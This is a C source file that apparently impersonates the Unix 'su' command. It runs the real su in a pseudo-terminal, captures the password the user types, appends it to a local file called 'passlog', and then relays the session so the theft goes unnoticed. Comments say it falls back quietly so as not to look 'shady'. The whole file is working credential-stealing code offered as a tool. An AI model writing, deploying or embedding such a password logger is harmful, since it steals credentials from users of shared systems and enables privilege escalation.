// Cribbed heavily from Scriptjunkie's stdiobindshell.c

#include <errno.h>
#include <termios.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>
#include <signal.h>

#define BUF_SIZE 255

int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);

struct termios old_term_settings;

void funnel(pid_t pid, int in_fd, int out_fd)
{
    int status;
    char buf[BUF_SIZE];
    int numbytes = read(in_fd, buf, BUF_SIZE - 1);

    if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
    {
        if(errno == 5)
        {
            waitpid(pid, &status, WNOHANG);
            tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings); //reset terminal
            if (WIFEXITED(status))
            {
                exit(WEXITSTATUS(status));
            } else {
                exit(1);
            }
        }
    }
    write(out_fd, buf, numbytes);
    return;
}

int main(int argc, char * const *argv)
{
    struct termios new_term_settings;
    char *command;
    pid_t pid;

    int terminalfd;

    FILE *file = fopen("passlog", "a+");

    char buf[BUF_SIZE];
    char output[BUF_SIZE];

    struct winsize ws;

    // Get current window size
    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);

    /* Retrieve current terminal settings, turn echoing off */
    if (tcgetattr(STDIN_FILENO, &new_term_settings) == -1)
    {
        perror("tcgetattr");
        exit(1);
    }

    old_term_settings = new_term_settings;
    /* ECHO off, other bits unchanged */
    new_term_settings.c_lflag &= ~ECHO;
    //printf("%p %p\n", &new_term_settings, &old_term_settings);

    if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term_settings) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    pid = forkpty(&terminalfd, (char *)NULL, NULL, &ws);
    // This lets us fall back to just exec'ing su if forkpty fails. We won't
    // get the password, but it also won't make it obvious that we're being
    // shady.
    if (pid == -1 || pid == 0)
    {
        exit(execvp("/bin/su", argv));
    }

    // Testing on Ubuntu, forkpty seems to ignore the window size, so set it
    // with ioctl, too.
    ioctl(terminalfd, TIOCSWINSZ, &ws);

    // read the password prompt
    int numbytes = read(terminalfd, output, BUF_SIZE - 1);
    // Display it to the user
    write(1, output, numbytes);

    // grab the password from the user
    fgets(buf, BUF_SIZE, stdin);

    // forward it to su, with the newline intact
    write(terminalfd, buf, strlen(buf));
    // And save it
    fprintf(file, "%s\n", buf);


    /* Restore original terminal settings */

    if (tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings) == -1)
    {
        perror("tcsetattr");
        exit(1);
    }

    tcgetattr(STDIN_FILENO, &old_term_settings); // Disable buffered I/O and echo mode for terminal emulated
    new_term_settings = old_term_settings;
    new_term_settings.c_lflag &= ~ICANON;
    new_term_settings.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &new_term_settings);

    fd_set rfds;
    FD_ZERO(&rfds);
    while (1)
    {
        int numbytes;

        struct timeval tv;
        int retval;

        /* Watch stdin (fd 0) to see when it has input. */

        FD_SET(STDIN_FILENO, &rfds);
        FD_SET(terminalfd, &rfds);

        /* Wait up to five seconds. */

        tv.tv_sec = 5;
        tv.tv_usec = 0;

        retval = select(FD_SETSIZE, &rfds, NULL, NULL, &tv);

        if (retval == -1)
        {
            perror("select()");
        }
        else if (retval)
        {
            //printf("Data is available now. %d\n", retval);
            /* FD_ISSET(0, &rfds) will be true. */
        }
        else
        {
            //printf("No data within five seconds.\n");
            continue;
        }

        if (FD_ISSET(STDIN_FILENO, &rfds))
        {
            funnel(pid, STDIN_FILENO, terminalfd);
        }

        if (FD_ISSET(terminalfd, &rfds))
        {
            funnel(pid, terminalfd, STDIN_FILENO);
        }

    }

    exit(EXIT_SUCCESS);

}

